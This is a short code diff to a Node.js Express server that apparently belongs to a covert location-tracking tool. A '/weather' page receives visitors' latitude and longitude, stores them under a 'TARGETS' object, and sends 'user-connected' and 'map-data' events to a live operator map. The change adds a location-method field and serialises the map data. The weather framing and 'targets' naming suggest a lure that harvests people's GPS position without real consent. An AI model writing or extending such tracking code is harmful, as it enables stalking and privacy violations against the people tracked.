@@ -21,13 +21,13 @@ router.route("/login").get((req, res) => {
 router.route("/weather").get((req, res) => {
     res.render("weather")
 }).post((req, res) => {
-    const { id, lat, lng } = req.body
+    const { id, lat, lng, method } = req.body
     if (TARGETS[id] == null) {
         IO.emit("user-connected", id)
     }
 
-    TARGETS[id] = [lat, lng]
-    IO.emit("map-data", { id, lat, lng })
+    TARGETS[id] = [lat, lng, method || "GPS (High Accuracy)"]
+    IO.emit("map-data", { id, lat, lng, method: method || "GPS (High Accuracy)" })
     res.send("OK")
     console.log(`> ${id} - ${TARGETS[id]}`)
 })
@@ -53,7 +53,7 @@ router.route("/map").get((req, res) => {
     const { id } = req.query
 
     res.render("map", {
-        data: TARGETS[id]
+        data: JSON.stringify(TARGETS[id] || null)
     })
 })
 
